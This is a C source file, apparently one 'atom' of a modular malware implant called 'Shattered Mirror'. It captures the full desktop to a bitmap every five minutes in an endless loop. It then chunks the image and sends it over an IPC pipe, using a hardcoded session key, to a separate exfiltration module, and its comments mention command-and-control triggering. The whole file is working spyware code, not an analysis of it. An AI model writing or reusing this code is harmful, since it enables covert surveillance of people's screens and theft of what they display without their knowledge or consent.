/*=============================================================================
 * Shattered Mirror v1 — Atom 06: Screen Capture
 *
 * Implements GDI+ or pure GDI screen capture. For MVP we use pure GDI to DIB section 
 * to avoid initializing the GDI+ subsystem cleanly within a thread, keeping it smaller.
 *===========================================================================*/

#include "Atom_06_Screen.h"
#include "../Orchestrator/AtomManager.h"

#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "user32.lib")

/* Helper to capture screen to raw BMP memory */
static BOOL CaptureScreenToMemory(BYTE** ppBmpData, DWORD* pdwSize) {
    int nScreenWidth = GetSystemMetrics(SM_CXSCREEN);
    int nScreenHeight = GetSystemMetrics(SM_CYSCREEN);

    HWND hDesktopWnd = GetDesktopWindow();
    HDC hDesktopDC = GetDC(hDesktopWnd);
    HDC hCaptureDC = CreateCompatibleDC(hDesktopDC);
    
    HBITMAP hCaptureBitmap = CreateCompatibleBitmap(hDesktopDC, nScreenWidth, nScreenHeight);
    SelectObject(hCaptureDC, hCaptureBitmap);
    
    /* Blit */
    BitBlt(hCaptureDC, 0, 0, nScreenWidth, nScreenHeight, hDesktopDC, 0, 0, SRCCOPY);

    /* Get DIB specifics */
    BITMAPINFO bmi = {0};
    bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    bmi.bmiHeader.biWidth = nScreenWidth;
    bmi.bmiHeader.biHeight = -nScreenHeight; /* top-down */
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biBitCount = 24;
    bmi.bmiHeader.biCompression = BI_RGB;

    DWORD dwBmpSize = ((nScreenWidth * bmi.bmiHeader.biBitCount + 31) / 32) * 4 * nScreenHeight;
    DWORD dwFullSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + dwBmpSize;

    *ppBmpData = (BYTE*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwFullSize);
    if (!*ppBmpData) {
        DeleteObject(hCaptureBitmap);
        DeleteDC(hCaptureDC);
        ReleaseDC(hDesktopWnd, hDesktopDC);
        return FALSE;
    }

    BITMAPFILEHEADER* bmfHeader = (BITMAPFILEHEADER*)*ppBmpData;
    bmfHeader->bfType = 0x4D42; /* "BM" */
    bmfHeader->bfSize = dwFullSize;
    bmfHeader->bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);

    memcpy(*ppBmpData + sizeof(BITMAPFILEHEADER), &bmi.bmiHeader, sizeof(BITMAPINFOHEADER));

    GetDIBits(hCaptureDC, hCaptureBitmap, 0, nScreenHeight, 
              *ppBmpData + bmfHeader->bfOffBits, &bmi, DIB_RGB_COLORS);

    *pdwSize = dwFullSize;

    DeleteObject(hCaptureBitmap);
    DeleteDC(hCaptureDC);
    ReleaseDC(hDesktopWnd, hDesktopDC);

    return TRUE;
}

DWORD WINAPI ScreenCaptureAtomMain(LPVOID lpParam) {
    DWORD dwAtomId = (DWORD)(ULONG_PTR)lpParam;
    HANDLE hPipe = IPC_ConnectToPipe(dwAtomId);
    if (!hPipe) return 1;

    BYTE SharedSessionKey[] = "780t93RsjAyjYlNm";

    while (TRUE) {
        /* Screen cap logic usually triggered by C2, we simulate an interval here */
        Sleep(60000 * 5); /* Every 5 mins */

        BYTE* pBmpData = NULL;
        DWORD dwBmpSize = 0;

        if (CaptureScreenToMemory(&pBmpData, &dwBmpSize)) {
            /* 
             * Because BMPs are extremely large (e.g. 1920x1080 * 3 bytes ~ 6MB),
             * we absolutely must chunk it before sending over our 4KB IPC pipes.
             */
            
            DWORD offset = 0;
            while (offset < dwBmpSize) {
                DWORD chunk = dwBmpSize - offset;
                if (chunk > MAX_IPC_PAYLOAD_SIZE) chunk = MAX_IPC_PAYLOAD_SIZE;

                IPC_MESSAGE msg = { 0 };
                msg.CommandId = CMD_EXECUTE; /* Send to Exfil atom logic */
                msg.dwPayloadLen = chunk;
                memcpy(msg.Payload, pBmpData + offset, chunk);

                IPC_SendMessage(hPipe, &msg, SharedSessionKey, sizeof(SharedSessionKey));
                offset += chunk;
                
                Sleep(50); /* Tiny throttle to not overwhelm IPC */
            }

            HeapFree(GetProcessHeap(), 0, pBmpData);
        }
    }
    return 0;
}
